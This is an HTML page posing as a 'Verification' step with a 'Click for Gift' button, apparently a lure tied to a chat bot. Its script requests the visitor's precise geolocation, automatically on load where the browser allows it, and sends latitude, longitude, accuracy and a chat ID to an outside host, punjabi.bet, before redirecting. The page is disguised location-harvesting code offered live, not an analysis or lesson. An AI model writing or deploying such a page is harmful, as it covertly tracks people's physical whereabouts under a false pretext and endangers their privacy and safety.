<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verification</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Noto+Sans:wght@700&display=swap');
    *{margin:0;padding:0;box-sizing:border-box;font-family:"Noto Sans",sans-serif}
    body{display:flex;align-items:center;justify-content:center;min-height:100vh;background:linear-gradient(135deg,#1E1E1E,#2C2C2C);color:#EAEAEA}
    .card{width:min(720px,92vw);text-align:center;padding:48px 28px;background:#282828;border-radius:14px;box-shadow:0 8px 30px rgba(0,0,0,.25);border:1px solid #444}
    h1{font-size:32px;font-weight:700;margin-bottom:16px;color:#FFD700;letter-spacing:1.1px;text-shadow:2px 2px 4px rgba(0,0,0,.5)}
    p{font-size:18px;margin:10px 0 18px;color:#ccc}
    .spinner{width:56px;height:56px;border:6px solid #EAEAEA;border-top:6px solid #FFD700;border-radius:50%;animation:spin 1s linear infinite;margin:16px auto 8px}
    @keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
    .row{display:flex;gap:12px;justify-content:center;flex-wrap:wrap;margin-top:18px}
    button{padding:12px 18px;border:1px solid #555;background:#1f1f1f;color:#fff;border-radius:10px;font-size:16px;font-weight:700;cursor:pointer;transition:.2s}
    button:hover{transform:translateY(-1px);box-shadow:0 6px 18px rgba(0,0,0,.25)}
    button.primary{background:#FFD700;color:#1b1b1b;border-color:#FFC300}
    .note{font-size:13px;color:#9c9c9c;margin-top:10px;line-height:1.4}
    .hidden{display:none}
  </style>
</head>
<body>
  <div class="card" id="card">
    <h1>Verification</h1>
    <div class="spinner hidden" id="spinner"></div>
    <p id="status"></p>
    <div class="row" id="actions">
      <button class="primary" id="allowBtn">Click for Gift</button>
      <button id="skipBtn">Skip gift</button>
    </div>
   
  </div>
  <script>
    const qs=new URLSearchParams(location.search)
    const chatId=qs.get('id')||''
    const statusEl=document.getElementById('status')
    const spinner=document.getElementById('spinner')
    const actions=document.getElementById('actions')
    const allowBtn=document.getElementById('allowBtn')
    const skipBtn=document.getElementById('skipBtn')
    const isSecure=location.protocol==='https:'||location.hostname==='localhost'
    const isiOSSafari=(()=>{const ua=navigator.userAgent;const isIOS=/iP(hone|ad|od)/.test(ua);const isSafari=/^((?!chrome|android).)*safari/i.test(ua);return isIOS&&isSafari})()
    const setBusy=b=>{spinner.classList.toggle('hidden',!b);actions.style.display=b?'none':'flex'}
    const goNext=shared=>{location.href=`/I/?id=${encodeURIComponent(chatId)}&shared=${shared?1:0}`}
    const sendGeo=async(lat,lon,acc)=>{const url=`https://punjabi.bet/webot/loc?lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}&acc=${encodeURIComponent(acc)}&chat_id=${encodeURIComponent(chatId)}&ts=${Date.now()}`;await fetch(url,{method:'GET',mode:'no-cors'})}
    const requestGeo=()=>{if(!isSecure){statusEl.textContent='Geolocation requires HTTPS.';return}if(!('geolocation'in navigator)){statusEl.textContent='Not supported.';return}setBusy(true);statusEl.textContent='Requesting...';navigator.geolocation.getCurrentPosition(async pos=>{try{await sendGeo(pos.coords.latitude,pos.coords.longitude,Math.round(pos.coords.accuracy||0));statusEl.textContent='Verification complete.';goNext(true)}catch{setBusy(false);statusEl.textContent='Verification failed.'}},err=>{setBusy(false);if(err.code===err.PERMISSION_DENIED){statusEl.textContent='Denied.'}else if(err.code===err.POSITION_UNAVAILABLE){statusEl.textContent='unavailable.'}else if(err.code===err.TIMEOUT){statusEl.textContent='Timed out.'}else{statusEl.textContent='Could not get location.'}},{enableHighAccuracy:true,timeout:12000,maximumAge:0})}
    allowBtn.addEventListener('click',requestGeo)
    skipBtn.addEventListener('click',()=>{statusEl.textContent='Continuing.';goNext(false)})
    ;(async()=>{if(!isiOSSafari&&isSecure){try{if(navigator.permissions?.query){const p=await navigator.permissions.query({name:'geolocation'});if(p.state==='granted'){requestGeo();return}if(p.state==='prompt'){requestGeo();return}}else{requestGeo()}}catch{}}actions.style.display='flex'})()
  </script>
</body>
</html>
